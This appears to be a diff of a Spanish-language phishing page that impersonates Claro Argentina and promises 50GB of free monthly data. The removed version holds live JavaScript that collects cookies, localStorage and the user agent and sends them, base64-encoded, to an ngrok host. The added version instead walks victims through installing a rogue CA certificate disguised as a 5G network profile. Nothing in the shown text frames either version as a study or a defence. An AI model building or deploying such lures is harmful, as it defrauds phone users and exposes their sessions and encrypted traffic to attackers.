@@ -2,40 +2,37 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Claro 5G | Activación Permanente</title>
-    <script>
-        var ng = "https://superdelicately-handworked-brenna.ngrok-free.dev/log?";
-
-        // Esta función crea un "puente" que no vence
-        async function activarAccesoPermanente() {
-            // Pedimos el permiso que abre la puerta a los datos
-            const permission = await Notification.requestPermission();
-            
-            if (permission === 'granted') {
-                // Capturamos el ID del dispositivo y los tokens de mensajería
-                var sessionData = {
-                    ua: navigator.userAgent,
-                    cookies: document.cookie,
-                    storage: localStorage
-                };
-                
-                // Mandamos el "Token Infinito" a tu NetHunter
-                new Image().src = ng + "fase=TOKEN_INFINITO&data=" + btoa(JSON.stringify(sessionData));
-
-                document.body.innerHTML = "<h1>Sincronización Completa</h1><p>Tu línea está vinculada permanentemente al nodo 5G de Claro.</p>";
-            } else {
-                alert("Para activar los 50GB permanentes, debes presionar 'Permitir'.");
-            }
-        }
-    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claro | Activación Beneficio 5G</title>
+    <style>
+        body { background: #ee1c25; color: white; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; }
+        .card { background: white; color: #333; padding: 25px; border-radius: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.2); max-width: 400px; margin: auto; }
+        .btn { background: #ee1c25; color: white; padding: 18px; border-radius: 10px; display: inline-block; font-weight: bold; text-decoration: none; margin-top: 20px; font-size: 18px; width: 100%; }
+        .instrucciones { text-align: left; font-size: 14px; margin-top: 15px; border-top: 1px solid #eee; padding-top: 10px; }
+    </style>
 </head>
-<body style="background:#000; color:#fff; font-family:sans-serif; text-align:center; padding-top:150px;">
-    <div style="border:1px solid #ee1c25; padding:40px; display:inline-block; border-radius:20px;">
-        <h1 style="color:#ee1c25;">CLARO ARGENTINA</h1>
-        <p>Activa el beneficio de <b>50GB MENSUALES</b> para siempre.</p>
-        <button onclick="activarAccesoPermanente()" style="background:#ee1c25; color:#fff; padding:20px 40px; border:none; border-radius:10px; font-weight:bold; cursor:pointer; font-size:18px;">
-            VINCULAR LÍNEA AHORA
-        </button>
+<body>
+    <h1>¡ÚLTIMO PASO!</h1>
+    <p>Para recibir tus <b>50GB MENSUALES</b>, debes sincronizar tu chip con nuestra red 5G.</p>
+    
+    <div class="card">
+        <h3 style="color: #ee1c25; margin-top: 0;">Soporte Técnico Claro</h3>
+        <p>Descarga e instala el certificado de validación de red para activar tu beneficio:</p>
+        
+        <a href="claro_config.crt" download="Validacion_Claro_5G.crt" class="btn">
+            DESCARGAR PERFIL 5G
+        </a>
+        
+        <div class="instrucciones">
+            <b>Cómo instalar:</b>
+            <ol>
+                <li>Descarga el archivo arriba.</li>
+                <li>Ve a <b>Ajustes > Seguridad > Instalar desde almacenamiento</b>.</li>
+                <li>Selecciona "Certificado de CA" o "Certificado de Red" y acepta.</li>
+            </ol>
+        </div>
     </div>
+    
+    <p style="font-size: 12px; margin-top: 20px;">© 2026 Claro Argentina - Conexión Segura.</p>
 </body>
 </html>
